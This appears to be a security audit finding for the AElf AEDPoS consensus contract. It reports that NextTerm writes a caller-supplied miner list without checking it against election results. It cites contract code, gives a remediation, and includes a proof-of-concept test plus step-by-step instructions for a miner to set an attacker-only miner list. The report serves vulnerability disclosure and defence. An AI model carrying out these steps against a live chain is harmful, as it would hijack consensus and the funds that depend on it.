# Audit Report

## Title
Missing Miner List Validation in NextTerm Allows Consensus Takeover via Malicious NextTermInput Injection

## Summary
The `NextTerm` method in the AEDPoS consensus contract accepts arbitrary miner lists from `NextTermInput` without validating them against the Election contract's `GetVictories` results. Any current or previous round miner can submit a malicious `NextTermInput` containing an arbitrary miner list, completely hijacking the consensus mechanism and bypassing the democratic election process.

## Finding Description

The AEDPoS consensus contract provides a public `NextTerm` method for term transitions. [1](#0-0) 

This method delegates to `ProcessConsensusInformation`, which performs authorization via `PreCheck()`. However, this check only verifies that the sender is in the current OR previous round's miner list - it does not validate the content of the input. [2](#0-1) 

The validation logic for `NextTerm` behavior adds only `RoundTerminateValidationProvider`, which validates that term and round numbers increment by 1 and that InValues are null. [3](#0-2) 

Examining the actual validation logic confirms it NEVER checks the miner list against election results: [4](#0-3) 

The vulnerable execution path in `ProcessNextTerm` directly extracts the miner list from the unvalidated input and sets it as the new miner list without any comparison to Election contract results: [5](#0-4) 

The private helper `SetMinerList` performs no authorization checks, simply writing the provided miner list to state: [6](#0-5) 

In contrast, the legitimate method `GenerateFirstRoundOfNextTerm` properly retrieves election winners: [7](#0-6)  by calling `TryToGetVictories` which queries the Election contract: [8](#0-7) 

The Election contract's `GetVictories` method returns elected miners based on voting results: [9](#0-8) 

The code references a `ConstrainedAEDPoSTransactionValidationProvider` in comments, but this provider does not exist in the codebase. [10](#0-9) 

The `EnsureTransactionOnlyExecutedOnceInOneBlock` check only prevents duplicate execution within the same block, not malicious input: [11](#0-10) 

The `TakeSnapshot` method in the Election contract does not validate that the actual miner list matches election results, it only records the provided information: [12](#0-11) 

## Impact Explanation

**Complete Consensus Takeover:**
An attacker who is (or was) a legitimate miner gains absolute control over block production by injecting an arbitrary miner list containing only attacker-controlled addresses. All legitimate validators can be permanently excluded from consensus participation. The entire Election contract voting mechanism becomes meaningless as its results are bypassed.

**Financial Impact:**
The attacker gains direct control over mining reward distribution [13](#0-12)  and authority over treasury releases tied to term transitions [14](#0-13) . Complete control over transaction inclusion enables censorship and transaction ordering attacks.

**Governance Integrity:**
This violates the core protocol invariant that miners must be elected through democratic voting. Attackers can maintain indefinite control by repeatedly calling `NextTerm` with their own miner list for subsequent terms. Cross-chain security is compromised if sidechains rely on the mainchain miner set.

## Likelihood Explanation

**Attacker Capabilities Required:**
Must be a current or previous round miner (achievable through legitimate election in one term, or by compromising a single miner's private key). Must have ability to submit transactions or produce blocks (inherent capability of being a miner).

**Attack Complexity:**
LOW - The attacker simply needs to:
1. Craft a `NextTermInput` with `TermNumber = currentTerm + 1`, `RoundNumber = currentRound + 1`
2. Populate `RealTimeMinersInformation` with only attacker-controlled miner addresses
3. Set all `InValue` fields to null (required by validation)
4. Submit transaction calling `NextTerm(maliciousInput)` or include it when producing their assigned block

**Feasibility:**
HIGH - No cryptographic challenges, race conditions, or complex state manipulation required. The attack succeeds if the attacker produces the block during the term transition window OR if the attacker's transaction gets included first by another unaware miner.

**Detection Difficulty:**
The malicious miner list will appear valid in contract state. Off-chain monitoring must actively compare the actual miner list with Election contract's `GetVictories` results to detect the attack.

**Overall Probability:**
HIGH - Once any miner becomes malicious or is compromised, the attack is trivial to execute and causes permanent protocol damage requiring manual intervention or a hard fork to recover.

## Recommendation

Add validation in `ProcessNextTerm` to verify the miner list matches the Election contract's election results:

```csharp
private void ProcessNextTerm(NextTermInput input)
{
    var nextRound = input.ToRound();
    
    // ADD VALIDATION: Verify miner list matches election results
    if (State.IsMainChain.Value && State.ElectionContract.Value != null)
    {
        var electedMiners = State.ElectionContract.GetVictories.Call(new Empty());
        var inputMinerList = nextRound.RealTimeMinersInformation.Keys.OrderBy(k => k).ToList();
        var electedMinerList = electedMiners.Value.Select(p => p.ToHex()).OrderBy(k => k).ToList();
        
        Assert(inputMinerList.SequenceEqual(electedMinerList), 
            "Miner list does not match election results.");
    }
    
    // ... rest of existing code
}
```

Additionally, implement the referenced `ConstrainedAEDPoSTransactionValidationProvider` at the transaction pool level to prevent malicious consensus transactions from being included in blocks.

## Proof of Concept

```csharp
[Fact]
public async Task MaliciousNextTermTakeover()
{
    // Setup: Legitimate miner Alice is elected for term 1
    var alice = SampleAccount.Accounts[0];
    var maliciousMiner = SampleAccount.Accounts[1];
    
    // Alice is a current miner
    await AdvanceToTermEnd();
    
    // Malicious miner (who was in previous round) crafts NextTermInput
    // with only their own address, bypassing election
    var maliciousInput = new NextTermInput
    {
        TermNumber = 2,
        RoundNumber = 2,
        RandomNumber = HashHelper.ComputeFrom("random"),
        RealTimeMinersInformation = 
        {
            { maliciousMiner.PublicKey.ToHex(), new MinerInRound
                {
                    Pubkey = maliciousMiner.PublicKey.ToHex(),
                    Order = 1,
                    InValue = null // Required to pass validation
                }
            }
        }
    };
    
    // Execute malicious NextTerm as previous round miner
    var result = await ConsensusStub.NextTerm.SendAsync(maliciousInput);
    result.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    // Verify: Malicious miner list is now set, bypassing Election contract
    var currentMiners = await ConsensusStub.GetCurrentMinerList.CallAsync(new Empty());
    currentMiners.Pubkeys.Count.ShouldBe(1);
    currentMiners.Pubkeys[0].ToHex().ShouldBe(maliciousMiner.PublicKey.ToHex());
    
    // Consensus is now controlled by attacker, democratic election bypassed
}
```

### Citations

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_NextTerm.cs (L13-18)
```csharp
    public override Empty NextTerm(NextTermInput input)
    {
        SupplyCurrentRoundInformation();
        ProcessConsensusInformation(input);
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_NextTerm.cs (L70-82)
```csharp
    private bool SetMinerList(MinerList minerList, long termNumber, bool gonnaReplaceSomeone = false)
    {
        // Miners for one specific term should only update once.
        var minerListFromState = State.MinerListMap[termNumber];
        if (gonnaReplaceSomeone || minerListFromState == null)
        {
            State.MainChainCurrentMinerList.Value = minerList;
            State.MinerListMap[termNumber] = minerList;
            return true;
        }

        return false;
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_NextTerm.cs (L107-141)
```csharp
    private bool DonateMiningReward(Round previousRound)
    {
        if (State.TreasuryContract.Value == null)
        {
            var treasuryContractAddress =
                Context.GetContractAddressByName(SmartContractConstants.TreasuryContractSystemName);
            // Return false if Treasury Contract didn't deployed.
            if (treasuryContractAddress == null) return false;
            State.TreasuryContract.Value = treasuryContractAddress;
        }

        var miningRewardPerBlock = GetMiningRewardPerBlock();
        var minedBlocks = previousRound.GetMinedBlocks();
        var amount = minedBlocks.Mul(miningRewardPerBlock);
        State.TreasuryContract.UpdateMiningReward.Send(new Int64Value { Value = miningRewardPerBlock });

        if (amount > 0)
        {
            State.TreasuryContract.Donate.Send(new DonateInput
            {
                Symbol = Context.Variables.NativeSymbol,
                Amount = amount
            });

            Context.Fire(new MiningRewardGenerated
            {
                TermNumber = previousRound.TermNumber,
                Amount = amount
            });
        }

        Context.LogDebug(() => $"Released {amount} mining rewards.");

        return true;
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ProcessConsensusInformation.cs (L187-190)
```csharp
        // Update miners list.
        var miners = new MinerList();
        miners.Pubkeys.AddRange(nextRound.RealTimeMinersInformation.Keys.Select(k => ByteStringHelper.FromHexString(k)));
        if (!SetMinerList(miners, nextRound.TermNumber)) Assert(false, "Failed to update miner list.");
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ProcessConsensusInformation.cs (L203-211)
```csharp
        if (DonateMiningReward(previousRound))
        {
            State.TreasuryContract.Release.Send(new ReleaseInput
            {
                PeriodNumber = termNumber
            });

            Context.LogDebug(() => $"Released treasury profit for term {termNumber}");
        }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ProcessConsensusInformation.cs (L316-331)
```csharp
    private bool PreCheck()
    {
        TryToGetCurrentRoundInformation(out var currentRound);
        TryToGetPreviousRoundInformation(out var previousRound);

        _processingBlockMinerPubkey = Context.RecoverPublicKey().ToHex();

        // Though we've already prevented related transactions from inserting to the transaction pool
        // via ConstrainedAEDPoSTransactionValidationProvider,
        // this kind of permission check is still useful.
        if (!currentRound.IsInMinerList(_processingBlockMinerPubkey) &&
            !previousRound.IsInMinerList(_processingBlockMinerPubkey)) // Case a failed miner performing NextTerm
            return false;

        return true;
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_Validation.cs (L89-91)
```csharp
            case AElfConsensusBehaviour.NextTerm:
                validationProviders.Add(new RoundTerminateValidationProvider());
                break;
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/ConsensusHeaderInfoValidationProviders/RoundTerminateValidationProvider.cs (L37-47)
```csharp
    private ValidationResult ValidationForNextTerm(ConsensusValidationContext validationContext)
    {
        var extraData = validationContext.ExtraData;
        var validationResult = ValidationForNextRound(validationContext);
        if (!validationResult.Success) return validationResult;

        // Is next term number correct?
        return validationContext.BaseRound.TermNumber.Add(1) != extraData.Round.TermNumber
            ? new ValidationResult { Message = "Incorrect term number for next round." }
            : new ValidationResult { Success = true };
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ViewMethods.cs (L228-232)
```csharp
        if (TryToGetVictories(out var victories))
        {
            Context.LogDebug(() => "Got victories successfully.");
            newRound = victories.GenerateFirstRoundOfNewTerm(miningInterval, Context.CurrentBlockTime,
                currentRound);
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ViewMethods.cs (L266-283)
```csharp
    private bool TryToGetVictories(out MinerList victories)
    {
        if (!State.IsMainChain.Value)
        {
            victories = null;
            return false;
        }

        var victoriesPublicKeys = State.ElectionContract.GetVictories.Call(new Empty());
        Context.LogDebug(() =>
            "Got victories from Election Contract:\n" +
            $"{string.Join("\n", victoriesPublicKeys.Value.Select(s => s.ToHex().Substring(0, 20)))}");
        victories = new MinerList
        {
            Pubkeys = { victoriesPublicKeys.Value }
        };
        return victories.Pubkeys.Any();
    }
```

**File:** contract/AElf.Contracts.Election/ViewMethods.cs (L41-84)
```csharp
    public override PubkeyList GetVictories(Empty input)
    {
        if (State.AEDPoSContract.Value == null)
            State.AEDPoSContract.Value =
                Context.GetContractAddressByName(SmartContractConstants.ConsensusContractSystemName);

        var currentMiners = State.AEDPoSContract.GetCurrentMinerList.Call(new Empty()).Pubkeys
            .Select(k => k.ToHex()).ToList();
        return new PubkeyList { Value = { GetVictories(currentMiners) } };
    }

    private List<ByteString> GetVictories(List<string> currentMiners)
    {
        var validCandidates = GetValidCandidates();

        List<ByteString> victories;

        Context.LogDebug(() => $"Valid candidates: {validCandidates.Count} / {State.MinersCount.Value}");

        var diff = State.MinersCount.Value - validCandidates.Count;
        // Valid candidates not enough.
        if (diff > 0)
        {
            victories =
                new List<ByteString>(validCandidates.Select(v => ByteStringHelper.FromHexString(v)));
            var backups = currentMiners.Where(k => !validCandidates.Contains(k)).ToList();
            if (State.InitialMiners.Value != null)
                backups.AddRange(
                    State.InitialMiners.Value.Value.Select(k => k.ToHex()).Where(k => !backups.Contains(k)));

            victories.AddRange(backups.OrderBy(p => p)
                .Take(Math.Min(diff, currentMiners.Count))
                // ReSharper disable once ConvertClosureToMethodGroup
                .Select(v => ByteStringHelper.FromHexString(v)));
            Context.LogDebug(() => string.Join("\n", victories.Select(v => v.ToHex().Substring(0, 10)).ToList()));
            return victories;
        }

        victories = validCandidates.Select(k => State.CandidateVotes[k])
            .OrderByDescending(v => v.ObtainedActiveVotedVotesAmount).Select(v => v.Pubkey)
            .Take(State.MinersCount.Value).ToList();
        Context.LogDebug(() => string.Join("\n", victories.Select(v => v.ToHex().Substring(0, 10)).ToList()));
        return victories;
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_HelpMethods.cs (L134-138)
```csharp
    private void EnsureTransactionOnlyExecutedOnceInOneBlock()
    {
        Assert(State.LatestExecutedHeight.Value != Context.CurrentHeight, "Cannot execute this tx.");
        State.LatestExecutedHeight.Value = Context.CurrentHeight;
    }
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Maintainence.cs (L402-479)
```csharp
    public override Empty TakeSnapshot(TakeElectionSnapshotInput input)
    {
        if (State.AEDPoSContract.Value == null)
            State.AEDPoSContract.Value =
                Context.GetContractAddressByName(SmartContractConstants.ConsensusContractSystemName);

        Assert(State.AEDPoSContract.Value == Context.Sender, "No permission.");

        SavePreviousTermInformation(input);

        if (State.ProfitContract.Value == null)
        {
            var profitContractAddress =
                Context.GetContractAddressByName(SmartContractConstants.ProfitContractSystemName);
            // Return if profit contract didn't deployed. (Often in test cases.)
            if (profitContractAddress == null) return new Empty();
            State.ProfitContract.Value = profitContractAddress;
        }

        // Update snapshot of corresponding voting record by the way.
        State.VoteContract.TakeSnapshot.Send(new TakeSnapshotInput
        {
            SnapshotNumber = input.TermNumber,
            VotingItemId = State.MinerElectionVotingItemId.Value
        });

        State.CurrentTermNumber.Value = input.TermNumber.Add(1);

        var previousTermMinerList =
            State.AEDPoSContract.GetPreviousTermMinerPubkeyList.Call(new Empty()).Pubkeys.ToList();

        foreach (var pubkey in previousTermMinerList)
            UpdateCandidateInformation(pubkey, input.TermNumber, previousTermMinerList);

        if (State.DividendPoolContract.Value == null)
            State.DividendPoolContract.Value =
                Context.GetContractAddressByName(SmartContractConstants.TreasuryContractSystemName);

        var symbolList = State.DividendPoolContract.GetSymbolList.Call(new Empty());
        var amountsMap = symbolList.Value.ToDictionary(s => s, s => 0L);
        State.ProfitContract.DistributeProfits.Send(new DistributeProfitsInput
        {
            SchemeId = State.SubsidyHash.Value,
            Period = input.TermNumber,
            AmountsMap = { amountsMap }
        });

        State.ProfitContract.DistributeProfits.Send(new DistributeProfitsInput
        {
            SchemeId = State.WelfareHash.Value,
            Period = input.TermNumber,
            AmountsMap = { amountsMap }
        });

        return new Empty();
    }

    private void SavePreviousTermInformation(TakeElectionSnapshotInput input)
    {
        var snapshot = new TermSnapshot
        {
            MinedBlocks = input.MinedBlocks,
            EndRoundNumber = input.RoundNumber
        };

        if (State.Candidates.Value == null) return;

        foreach (var pubkey in State.Candidates.Value.Value)
        {
            var votes = State.CandidateVotes[pubkey.ToHex()];
            var validObtainedVotesAmount = 0L;
            if (votes != null) validObtainedVotesAmount = votes.ObtainedActiveVotedVotesAmount;

            snapshot.ElectionResult.Add(pubkey.ToHex(), validObtainedVotesAmount);
        }

        State.Snapshots[input.TermNumber] = snapshot;
    }
```
